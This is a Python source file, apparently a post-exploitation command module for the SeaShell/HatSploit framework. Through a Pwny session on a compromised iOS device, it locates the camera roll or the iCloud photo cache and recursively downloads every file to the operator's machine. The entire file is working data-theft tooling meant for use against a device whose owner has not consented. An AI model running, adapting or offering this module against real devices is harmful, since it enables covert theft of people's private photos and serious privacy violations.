"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

import os

from pwny.api import *
from pwny.types import *

from pex.string import String

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "photos",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Download photos available on device or iCloud.",
            'Usage': "photos [local|icloud] <local_path>",
            'MinArgs': 2
        }

        self.string = String()

    def recursive_walk(self, remote_path, local_path):
        result = self.session.send_command(
            tag=FS_LIST,
            args={
                TLV_TYPE_PATH: remote_path
            }
        )

        if result.get_int(TLV_TYPE_STATUS) == TLV_STATUS_SUCCESS:
            if not os.path.isdir(local_path):
                os.mkdir(local_path)

            file = result.get_tlv(TLV_TYPE_GROUP)

            while file:
                try:
                    hash = self.string.bytes_to_stat(file.get_raw(TLV_TYPE_BYTES))
                except Exception:
                    hash = {}

                file_type = self.string.mode_type(hash.get('st_mode', 0))
                path = file.get_string(TLV_TYPE_PATH)

                if file_type == 'file':
                    self.session.download(
                        path, local_path + '/' + os.path.split(path)[1])

                elif file_type == 'directory':
                    self.recursive_walk(
                        path, local_path + '/' + os.path.split(path)[1])

                file = result.get_tlv(TLV_TYPE_GROUP)

    def run(self, argc, argv):
        if argv[1] == 'icloud':
            path = '/var/mobile/Media/PhotoData/CPLAssets'
        else:
            path = '/var/mobile/Media/DCIM'

        result = self.session.send_command(
            tag=FS_STAT,
            args={
                TLV_TYPE_PATH: path
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(f"Photos can't be located!")
            return

        self.recursive_walk(path, argv[2])
